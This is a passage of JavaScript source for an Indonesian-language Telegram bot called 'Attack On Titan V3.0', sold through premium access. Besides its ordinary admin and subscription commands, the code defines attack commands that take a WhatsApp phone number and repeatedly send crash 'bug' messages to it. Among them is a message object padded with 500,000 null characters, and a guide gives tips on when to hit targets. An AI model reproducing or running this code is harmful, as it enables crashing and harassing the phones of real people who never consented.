 ├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
 │ • Reply pesan user + ketik /addadmin
 │ • /addadmin <id_user>
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ • Reply pesan + /addadmin
 │ • /addadmin 123456789
 │
 ╰═════════════════════⊱`);
        }
        userId = args[1];
    }

    // Check if already admin
    if (adminList.includes(userId)) {
        return await ctx.reply(`
 ╭═══════『 𝐆𝐚𝐠𝐚𝐥 』═══════⊱
 │
 ├─────『 𝐈𝐧𝐟𝐨 』
 │ • User sudah menjadi admin
 │ • ID: ${userId}
 │
 ╰═════════════════════⊱`);
    }

    try {
        // Add as admin
        addAdmin(userId);

        // Get user information if available
        let userInfo = "";
        if (ctx.message.reply_to_message) {
            const username = ctx.message.reply_to_message.from.username;
            const firstName = ctx.message.reply_to_message.from.first_name;
            userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
        }

        const successMessage = `
 ╭═══════『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐝𝐝𝐞𝐝 』═══════⊱
 │
 ├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
 │ - *ID:* ${userId}
 ${userInfo}│ - *Status:* Admin Active ✅
 │
 ├─────『 𝐀𝐜𝐜𝐞𝐬𝐬 』
 │ • /addprem command
 │ • /delprem command
 │ • Premium management
 │
 ╰═════════════════════⊱`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: " ADMIN LIST",
                        callback_data: "listadmin"
                    }]
                ]
            }
        });

    } catch (error) {
        console.error("Error in addadmin:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menambahkan admin. Silakan coba lagi.");
    }
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: "ℹ️ Daftar Admin",
                    callback_data: "listadmin"
                }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0 ?
        adminList.map(id => `- ${id}`).join("\n") :
        "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userId, durationDays;
    const args = ctx.message.text.split(" ");

    // Check if command is a reply to a message
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
        durationDays = parseInt(args[1]);

        if (!durationDays || isNaN(durationDays) || durationDays <= 0) {
            return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
        }
    } else {
        // Manual ID input
        if (args.length < 3) {
            return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
        }

        userId = args[1];
        durationDays = parseInt(args[2]);

        if (isNaN(durationDays) || durationDays <= 0) {
            return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
        }
    }

    try {
        // Add premium user
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss')
            .tz('Asia/Jakarta')
            .format('DD-MM-YYYY HH:mm:ss');

        // Get user information if available
        let userInfo = "";
        if (ctx.message.reply_to_message) {
            const username = ctx.message.reply_to_message.from.username;
            const firstName = ctx.message.reply_to_message.from.first_name;
            userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
        }

        const successMessage = `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID User:* ${userId}
${userInfo}│ - *Status:* Premium Active ✅
│ - *Durasi:* ${durationDays} hari
│ - *Expired:* ${formattedExpiration} WIB
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Akses ke semua fitur premium
│ • Priority support
│ • Unlimited penggunaan
│
╰═════════════════════⊱
`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Status Premium",
                        callback_data: `cekprem_${userId}`
                    }],
                    [{
                        text: " Premium Info ",
                        callback_data: `premium_guide`
                    }]
                ]
            },
            reply_to_message_id: ctx.message.message_id
        });

    } catch (error) {
        console.error("Error in addprem:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.");
    }
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const processMessage = `
『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』
╔══════════════════
║  TARGET: +${target.split('@')[0]}
║  STATUS: █▒▒▒▒▒▒▒▒▒ 15%
╚══════════════════`;

    try {
        await ctx.reply(processMessage);
    } catch (error) {
        console.error('Process error:', error);
    }
};

const donerespone = async (target, ctx) => {
    const successMessage = `
『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』
╔══════════════════ 
║  TARGET: +${target.split('@')[0]}
║  STATUS: ██████████ 100%
╚══════════════════`;

    try {
        await ctx.reply(successMessage);
    } catch (error) {
        console.error('Response error:', error);
    }
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
    key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
    },
    message: {
        interactiveResponseMessage: {
            body: {
                text: "Sent",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                version: 3
            }
        }
    }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /crash (Placeholder for your actual crash functions) ---
// Helper function to format phone number
function formatPhoneNumber(number) {
    // Remove all non-numeric characters
    let cleaned = number.replace(/[^0-9]/g, '');

    // Remove leading '+' if exists
    cleaned = cleaned.replace(/^\+/, '');

    // If number starts with '0', replace it with '62'
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // If number doesn't start with '62', add it
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}
// Fungsi untuk format nomor yang lebih robust
function formatPhoneNumber(number) {
    // Hapus semua karakter non-digit
    let cleaned = number.replace(/[^0-9]/g, '');

    // Hapus awalan +
    cleaned = cleaned.replace(/^\+/, '');

    // Jika dimulai dengan 0, ganti dengan 62
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // Jika belum ada 62, tambahkan
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}

// Enhanced command handlers
// Fungsi untuk format nomor yang lebih robust
function formatPhoneNumber(number) {
    // Hapus semua karakter non-angka
    let cleaned = number.replace(/[^0-9]/g, '');

    // Hapus awalan +
    cleaned = cleaned.replace(/^\+/, '');

    // Jika dimulai dengan 0, ganti dengan 62
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // Jika belum ada 62, tambahkan
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}
//NusantaraV1 
bot.command("titanv2", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek dulu nih usernya lagi cooldown apa ngga
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
 ╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
 │
 ├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
 │ • Status: Masih Cooldown 
 │ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
 │
 ├─────『 𝐍𝐨𝐭𝐞 』
 │ • Sabar ya, tunggu dulu
 │ • Biar ga error sistemnya
 │
 ╰═════════════════════⊱`);
    }

    // Misahin perintah jadi beberapa bagian
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
 ╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ •  /titanv2 628xxx      < 1 - 20 >
 │
 ├─────『 𝐏𝐞𝐧𝐭𝐢𝐧𝐠 』
 │ • Bisa pake 0/62/+62
 │
 ╰═════════════════════⊱`);
    }

    // Ambil nomor HP sama berapa kali mau ngirim
    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 20; // Kalo ga diisi, otomatis 8x

    // Cek jumlah kirimnya masuk akal apa ngga
    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Woy! Kebanyakan! Max 20x aja ya!");
    }

    // Format nomornya biar bener
    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    // Kasih tau kalo prosesnya udah mulai
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Mulai ngirim bug sesuai jumlah yang diminta
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
    }

    // Kasih tau kalo udah selesai
    await donerespone(target, ctx);
});

// Command cursoriosv1
bot.command("attackontitan", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek dulu nih usernya lagi cooldown apa ngga
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
╭═══════『 𝐖𝐚𝐢𝐭 𝐃𝐮𝐥𝐮 𝐁𝐫𝐨! 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Masih Cooldown ⏳
│ • Tunggu: ${cooldownStatus.remainingTime} detik
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Santuy dulu bang, tunggu bentar
│ • Biar ga error sistemnya
│
╰═════════════════════⊱`);
    }

    // Ambil inputan dari pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ •   /attackontitan 628xxx      < 1 - 20 >
 │
 ├─────『 𝐏𝐞𝐧𝐭𝐢𝐧𝐠 』
 │ • Bisa pake 0/62/+62
 │
 ╰═════════════════════⊱`);
    }

    // Ambil nomor HP sama berapa kali mau ngirim
    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 23; // Default 8x kalo ga diisi

    // Cek jumlahnya masuk akal ga
    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 30) {
        return await ctx.reply(`
╭═══════『 𝐄𝐫𝐫𝐨𝐫 𝐁𝐫𝐨! 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Kebanyakan boss!
│ • Max 20x aja ya
│ • Biar HP target ga meledak 😅
│
╰═════════════════════⊱`);
    }

    // Format nomornya biar bener
    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    // Kasih tau proses dimulai
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Gas kirim bug sesuai jumlah
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true); // Double hit biar makin ampuh
    }

    // Kasih tau kalo udah beres
    await donerespone(target, ctx);
});

// Command iosv1
bot.command("xattack", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek cooldown
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
  ╭═══════『 𝐒𝐚𝐛𝐚𝐫 𝐃𝐮𝐥𝐮! 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Tunggu: ${cooldownStatus.remainingTime} detik
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Tunggu cooldown selesai ya
  │
  ╰═════════════════════⊱`);
    }

    // Split pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ •    /xattack 628xxx      < 1 - 20 >
 │
 ├─────『 𝐏𝐞𝐧𝐭𝐢𝐧𝐠 』
 │ • Bisa pake 0/62/+62
 │
 ╰═════════════════════⊱`);
    }

    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 10;

    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Max 20x kirim ya!");
    }

    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true);
    }

    await donerespone(target, ctx);
});

// Command nusantarav2
bot.command("titanv3", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek cooldown
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
  ╭═══════『 𝐒𝐚𝐛𝐚𝐫 𝐃𝐮𝐥𝐮! 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Tunggu: ${cooldownStatus.remainingTime} detik
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Cooldown dulu bro
  │
  ╰═════════════════════⊱`);
    }

    // Split pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ •   /titanv3 628xxx      < 1 - 20 >
 │
 ├─────『 𝐏𝐞𝐧𝐭𝐢𝐧𝐠 』
 │ • Bisa pake 0/62/+62
 │
 ╰═════════════════════⊱`);
    }

    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 8;

    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Maksimal 20x hit ya!");
    }

    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Double hit untuk efek maksimal
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true);
    }

    await donerespone(target, ctx);
});

bot.start(async (ctx) => {
    // Mengirim status "mengetik"
    await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

    // Periksa status koneksi, owner, admin, dan premium
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
═╭══════『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎 』═══════⊱
┃ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: @Putrialpiran
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧: 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐕𝟑 
┃ 𝐀𝐝𝐦𝐢𝐧: ${isAdminStatus ? '✅' : '❌'}
┃ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦: ${isPremium ? '✅' : '❌'}
┃ 𝐂𝐡𝐚𝐧𝐧𝐞𝐥:
╰═════════════════════⊱
   
╭════════『 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 』═══════⊱
┃ ❯ *Allah SWT*
┃ ❯ *Kedua Orang Tua*
┃ ❯ *Diri saya sendiri*
┃ ❯ *All Supporter*
╰═════════════════════⊱

╭═══════『 𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐀𝐍𝐃𝐑𝐎𝐈𝐃』═══════⊱
┃ ═════════════════════════
┃ ❯ 『   /titanv2 628xxxxxxx  』
┃ ═════════════════════════
┃ ❯ 『   /titanv3 628xxxxxxx  』
┃  ═════════════════════════
╰═════════════════════⊱

╭═══════『 𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐈𝐎𝐒』═══════⊱
┃ ═════════════════════════
┃ ❯ 『   /attackontitan 628xxxxxxx  』
┃ ═════════════════════════
┃ ❯ 『    /xattack 628xxxxxxx  』
┃  ═════════════════════════
╰═════════════════════⊱

╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
┃ *COOMING SOON :* V3.0
┃ *JOIN UPGRADE :* @ziyy102h
┃ *UPGRADE :* 2025 - 4 - 5
╰═════════════════════⊱
   "𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎"
   *Developer :* @Putrialpiran
`;

    const mainKeyboard = [
        [{
            text: "𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎",
            url: "https://t.me/ziyy102h"
        }],
        [{
            text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐌𝐞𝐧𝐮",
            callback_data: "developercmd"
        }],
        [{
                text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                callback_data: "bugmenu"
            },
            {
                text: "𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮",
                callback_data: "adminmenu"
            }
        ],
        [{
            text: "𝐒𝐭𝐚𝐭𝐮𝐬 & 𝐈𝐧𝐟𝐨",
            callback_data: "statusinfo"
        }]
    ];

    // Mengirim pesan setelah delay 1 detik
    setTimeout(async () => {
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }, 1000);
});

// Handler untuk callback "owner_management"
bot.action('developercmd', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const mainMenuMessage = `
╔════『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』════⊳
║
╠══『 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐂𝐎𝐍𝐒𝐎𝐋𝐄 』
║
║  /addadmin  »  System Admin Control
╠════════════════════
║  /deladmin  »  Remove Admin Access
╠════════════════════
║  /cekusersc »  System Usage Monitor
╠════════════════════
║  /monitoruser » User Activity Track
╠════════════════════
║  /addpairing » Connect WhatsApp
╠════════════════════
║⚠️ /maintenance » System Lock
╠════════════════════
║⚠️ /removeallbot » Remove Bot / Sender
║
╠══『 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 』══════
║ • Mode: ACTIVE 
║ • Security: ENABLED 
║ • Access: RESTRICTED ⚠️
║
╚═════════════════════⊳
𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎| @Putrialpiran`;

    const mainKeyboard = [
        [{
            text: "𝐎𝐖𝐍𝐄𝐑",
            callback_data: "developercmd"
        }],
        [{
            text: "MENU",
            callback_data: "main_menu"
        }]
    ];

    await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
        caption: mainMenuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: mainKeyboard
        }
    });
});

bot.action('adminmenu', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const mainMenuMessage = `
╔════『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』════⊳
║
╠══『 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 』
║
║ /addprem  »  Grant Premium Power
║ /delprem  »  Revoke Premium Access
║
╠══『 𝐀𝐂𝐂𝐄𝐒𝐒 𝐋𝐄𝐕𝐄𝐋 』
║ • Authority: ADMIN CLASS
║ • Clearance: HIGH PRIORITY
║ • Commands: PREMIUM CONTROL
║
╚═════════════════════⊳
𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎| @Putrialpiran`;

    const mainKeyboard = [
        [{
            text: "ADMIN MENU",
            callback_data: "adminmenu"
        }],
        [{
            text: "MENU",
            callback_data: "main_menu"
        }]
    ];

    await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
        caption: mainMenuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: mainKeyboard
        }
    });
});

bot.action('bugmenu', async (ctx) => {
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
  ╭═══════『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』═══════⊱
  │

   ╭═══════『 𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐀𝐍𝐃𝐑𝐎𝐈𝐃』═══════⊱
   ┃ ═════════════════════════
   ┃ ❯ 『   /titanv2 628xxxxxxx  』
   ┃ ═════════════════════════
   ┃ ❯ 『   /titanv3 628xxxxxxx  』
   ┃  ═════════════════════════
   ╰═════════════════════⊱



   ╭═══════『 𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐈𝐎𝐒』═══════⊱
   ┃ ═════════════════════════
   ┃ ❯ 『   /attackontitan 628xxxxxxx  』
   ┃ ═════════════════════════
   ┃ ❯ 『    /xattack 628xxxxxxx  』
   ┃  ═════════════════════════
   ╰═════════════════════⊱
  │
  ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
  │ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
  │ • Cooldown: ${bugCooldown} detik
  │ • Version: 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎
  │
  │
  ╰═════════════════════⊱
  
  *Devloper : @Putrialpiran*`;

    const mainKeyboard = [
        [{
                text: "ANDROID INFO",
                callback_data: "android_guide"
            },
            {
                text: "PESAN",
                callback_data: "pesan"
            }
        ],
        [{
            text: "PREMIUM ACCESS",
            callback_data: "premiuminfo"
        }],
        [{
            text: "BACK",
            callback_data: "main_menu"
        }]
    ];

    try {
        await ctx.deleteMessage();
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

bot.action('android_guide', async (ctx) => {
    const guideMessage = `
╭═══════『 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐁𝐞𝐬𝐭 𝐏𝐫𝐚𝐜𝐭𝐢𝐜𝐞𝐬 』
│ • Use nightbons for older Android
│ • Use nightv2 for Android 13+
│ • Wait cooldown between attacks
│ • Verify target's Android version
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐢𝐩𝐬 』
│ • Best time: When target is online
│ • Recommended: 2-3 hits per target
│ • Avoid spam to prevent block
│
╰═════════════════════⊱`;

    try {
        // Hapus pesan sebelumnya
        await ctx.deleteMessage();

        // Kirim pesan baru dengan gambar
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: guideMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "BUG MENU",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    } catch (error) {
        // Fallback jika ada error
        await ctx.reply(guideMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "BUG MENU",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    }
